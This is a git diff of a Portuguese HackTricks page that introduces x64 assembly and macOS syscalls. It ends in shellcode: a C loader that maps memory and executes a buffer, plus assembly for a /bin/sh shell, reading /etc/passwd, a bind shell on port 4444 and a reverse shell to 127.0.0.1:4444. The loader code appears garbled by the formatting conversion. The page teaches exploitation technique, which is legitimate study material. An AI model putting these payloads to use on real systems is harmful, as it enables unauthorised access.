@@ -1,4 +1,4 @@
-# Introdução ao x64
+# Introduction to x64
 
 <details>
 
@@ -6,11 +6,11 @@
 
 Outras maneiras de apoiar o HackTricks:
 
-- Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-- Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
-- Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-- **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-- **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
+* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
 
 </details>
 
@@ -35,8 +35,8 @@ O x64 expande a arquitetura x86, apresentando **16 registradores de propósito g
 
 A convenção de chamada x64 varia entre sistemas operacionais. Por exemplo:
 
-- **Windows**: Os primeiros **quatro parâmetros** são passados nos registradores **`rcx`**, **`rdx`**, **`r8`** e **`r9`**. Parâmetros adicionais são empurrados para a pilha. O valor de retorno está em **`rax`**.
-- **System V (comumente usado em sistemas semelhantes ao UNIX)**: Os primeiros **seis parâmetros inteiros ou de ponteiro** são passados nos registradores **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`** e **`r9`**. O valor de retorno também está em **`rax`**.
+* **Windows**: Os primeiros **quatro parâmetros** são passados nos registradores **`rcx`**, **`rdx`**, **`r8`** e **`r9`**. Parâmetros adicionais são empurrados para a pilha. O valor de retorno está em **`rax`**.
+* **System V (comumente usado em sistemas semelhantes ao UNIX)**: Os primeiros **seis parâmetros inteiros ou de ponteiro** são passados nos registradores **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`** e **`r9`**. O valor de retorno também está em **`rax`**.
 
 Se a função tiver mais de seis entradas, o **restante será passado na pilha**. O **RSP**, o ponteiro de pilha, deve estar **alinhado em 16 bytes**, o que significa que o endereço para o qual ele aponta deve ser divisível por 16 antes de qualquer chamada acontecer. Isso significa que normalmente precisaríamos garantir que o RSP esteja devidamente alinhado em nosso shellcode antes de fazer uma chamada de função. No entanto, na prática, as chamadas de sistema funcionam muitas vezes mesmo se esse requisito não for atendido.
 
@@ -48,22 +48,22 @@ Swift tem sua própria **convenção de chamada** que pode ser encontrada em [**
 
 As instruções x64 possuem um conjunto rico, mantendo a compatibilidade com instruções x86 anteriores e introduzindo novas.
 
-- **`mov`**: **Move** um valor de um **registrador** ou **local de memória** para outro.
-  - Exemplo: `mov rax, rbx` — Move o valor de `rbx` para `rax`.
-- **`push`** e **`pop`**: Empurra ou retira valores da **pilha**.
-  - Exemplo: `push rax` — Empurra o valor em `rax` para a pilha.
-  - Exemplo: `pop rax` — Retira o valor do topo da pilha para `rax`.
-- **`add`** e **`sub`**: Operações de **adição** e **subtração**.
-  - Exemplo: `add rax, rcx` — Adiciona os valores em `rax` e `rcx`, armazenando o resultado em `rax`.
-- **`mul`** e **`div`**: Operações de **multiplicação** e **divisão**. Observação: essas têm comportamentos específicos em relação ao uso do operando.
-- **`call`** e **`ret`**: Usados para **chamar** e **retornar de funções**.
-- **`int`**: Usado para acionar uma **interrupção de software**. Por exemplo, `int 0x80` era usado para chamadas de sistema no Linux x86 de 32 bits.
-- **`cmp`**: **Compara** dois valores e define as flags da CPU com base no resultado.
-  - Exemplo: `cmp rax, rdx` — Compara `rax` com `rdx`.
-- **`je`, `jne`, `jl`, `jge`, ...**: Instruções de **salto condicional** que alteram o fluxo de controle com base nos resultados de um `cmp` ou teste anterior.
-  - Exemplo: Após uma instrução `cmp rax, rdx`, `je label` — Salta para `label` se `rax` for igual a `rdx`.
-- **`syscall`**: Usado para **chamadas de sistema** em alguns sistemas x64 (como Unix modernos).
-- **`sysenter`**: Uma instrução otimizada de **chamada de sistema** em algumas plataformas.
+* **`mov`**: **Move** um valor de um **registrador** ou **local de memória** para outro.
+  * Exemplo: `mov rax, rbx` — Move o valor de `rbx` para `rax`.
+* **`push`** e **`pop`**: Empurra ou retira valores da **pilha**.
+  * Exemplo: `push rax` — Empurra o valor em `rax` para a pilha.
+  * Exemplo: `pop rax` — Retira o valor do topo da pilha para `rax`.
+* **`add`** e **`sub`**: Operações de **adição** e **subtração**.
+  * Exemplo: `add rax, rcx` — Adiciona os valores em `rax` e `rcx`, armazenando o resultado em `rax`.
+* **`mul`** e **`div`**: Operações de **multiplicação** e **divisão**. Observação: essas têm comportamentos específicos em relação ao uso do operando.
+* **`call`** e **`ret`**: Usados para **chamar** e **retornar de funções**.
+* **`int`**: Usado para acionar uma **interrupção de software**. Por exemplo, `int 0x80` era usado para chamadas de sistema no Linux x86 de 32 bits.
+* **`cmp`**: **Compara** dois valores e define as flags da CPU com base no resultado.
+  * Exemplo: `cmp rax, rdx` — Compara `rax` com `rdx`.
+* **`je`, `jne`, `jl`, `jge`, ...**: Instruções de **salto condicional** que alteram o fluxo de controle com base nos resultados de um `cmp` ou teste anterior.
+  * Exemplo: Após uma instrução `cmp rax, rdx`, `je label` — Salta para `label` se `rax` for igual a `rdx`.
+* **`syscall`**: Usado para **chamadas de sistema** em alguns sistemas x64 (como Unix modernos).
+* **`sysenter`**: Uma instrução otimizada de **chamada de sistema** em algumas plataformas.
 
 ### **Prólogo da Função**
 
@@ -82,6 +82,7 @@ As instruções x64 possuem um conjunto rico, mantendo a compatibilidade com ins
 ### Chamadas de sistema
 
 Existem diferentes classes de chamadas de sistema, você pode [**encontrá-las aqui**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall\_sw.h)**:**
+
 ```c
 #define SYSCALL_CLASS_NONE	0	/* Invalid */
 #define SYSCALL_CLASS_MACH	1	/* Mach */
@@ -90,7 +91,9 @@ Existem diferentes classes de chamadas de sistema, você pode [**encontrá-las a
 #define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
 #define SYSCALL_CLASS_IPC	5	/* Mach IPC */
 ```
+
 Em seguida, você pode encontrar o número de cada chamada de sistema [**neste URL**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
+
 ```c
 0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
 1	AUE_EXIT	ALL	{ void exit(int rval); }
@@ -107,6 +110,7 @@ Em seguida, você pode encontrar o número de cada chamada de sistema [**neste U
 12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
 [...]
 ```
+
 Portanto, para chamar a chamada de sistema `open` (**5**) da classe **Unix/BSD**, você precisa adicionar: `0x2000000`
 
 Portanto, o número da chamada de sistema para chamar o open seria `0x2000005`
@@ -139,59 +143,42 @@ otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g'
 <details>
 
 <summary>Código C para testar o shellcode</summary>
-```c
-// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
-// gcc loader.c -o loader
-#include <stdio.h>
-#include <sys/mman.h>
-#include <string.h>
-#include <stdlib.h>
 
-int (*sc)();
+\`\`\`c // code from https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/helper/loader.c // gcc loader.c -o loader #include #include #include #include
 
-char shellcode[] = "<INSERT SHELLCODE HERE>";
+int (\*sc)();
 
-int main(int argc, char **argv) {
-printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));
+char shellcode\[] = "";
 
-void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);
+int main(int argc, char \*\*argv) { printf("\[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));
 
-if (ptr == MAP_FAILED) {
-perror("mmap");
-exit(-1);
-}
-printf("[+] SUCCESS: mmap\n");
-printf("    |-> Return = %p\n", ptr);
+void \*ptr = mmap(0, 0x1000, PROT\_WRITE | PROT\_READ, MAP\_ANON | MAP\_PRIVATE | MAP\_JIT, -1, 0);
 
-void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
-printf("[+] SUCCESS: memcpy\n");
-printf("    |-> Return = %p\n", dst);
+if (ptr == MAP\_FAILED) { perror("mmap"); exit(-1); } printf("\[+] SUCCESS: mmap\n"); printf(" |-> Return = %p\n", ptr);
 
-int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);
+void \*dst = memcpy(ptr, shellcode, sizeof(shellcode)); printf("\[+] SUCCESS: memcpy\n"); printf(" |-> Return = %p\n", dst);
 
-if (status == -1) {
-perror("mprotect");
-exit(-1);
-}
-printf("[+] SUCCESS: mprotect\n");
-printf("    |-> Return = %d\n", status);
+int status = mprotect(ptr, 0x1000, PROT\_EXEC | PROT\_READ);
 
-printf("[>] Trying to execute shellcode...\n");
+if (status == -1) { perror("mprotect"); exit(-1); } printf("\[+] SUCCESS: mprotect\n"); printf(" |-> Return = %d\n", status);
 
-sc = ptr;
-sc();
+printf("\[>] Trying to execute shellcode...\n");
 
-return 0;
-}
-```
+sc = ptr; sc();
+
+return 0; }
+
+````
 </details>
 
 #### Shell
 
 Retirado [**aqui**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) e explicado.
 
-{% tabs %}
-{% tab title="com adr" %}
+<div data-gb-custom-block data-tag="tabs">
+
+<div data-gb-custom-block data-tag="tab" data-title='com adr'>
+
 ```armasm
 bits 64
 global _main
@@ -205,10 +192,8 @@ push    59                ; put 59 on the stack (execve syscall)
 pop     rax               ; pop it to RAX
 bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
 syscall
-```
-{% endtab %}
+````
 
-{% tab title="com pilha" %}
 ```armasm
 bits 64
 global _main
@@ -224,12 +209,11 @@ pop     rax               ; pop it to RAX
 bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
 syscall
 ```
-{% endtab %}
-{% endtabs %}
 
-#### Ler com cat
+**Ler com cat**
 
 O objetivo é executar `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, então o segundo argumento (x1) é um array de parâmetros (o que na memória significa uma pilha de endereços).
+
 ```armasm
 bits 64
 section .text
@@ -260,7 +244,9 @@ section .data
 cat_path:      db "/bin/cat", 0
 passwd_path:   db "/etc/passwd", 0
 ```
-#### Invocar comando com sh
+
+**Invocar comando com sh**
+
 ```armasm
 bits 64
 section .text
@@ -298,9 +284,11 @@ sh_path:        db "/bin/sh", 0
 sh_c_option:    db "-c", 0
 touch_command:  db "touch /tmp/lalala", 0
 ```
-#### Shell de ligação
+
+**Shell de ligação**
 
 Shell de ligação de [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) na **porta 4444**
+
 ```armasm
 section .text
 global _main
@@ -375,9 +363,11 @@ mov  rax, r8
 mov  al, 0x3b
 syscall
 ```
-#### Shell Reverso
+
+**Shell Reverso**
 
 Shell reverso em [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Shell reverso para **127.0.0.1:4444**
+
 ```armasm
 section .text
 global _main
@@ -439,16 +429,7 @@ mov  rax, r8
 mov  al, 0x3b
 syscall
 ```
-<details>
 
-<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Outras maneiras de apoiar o HackTricks:
-
-* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
 
 </details>
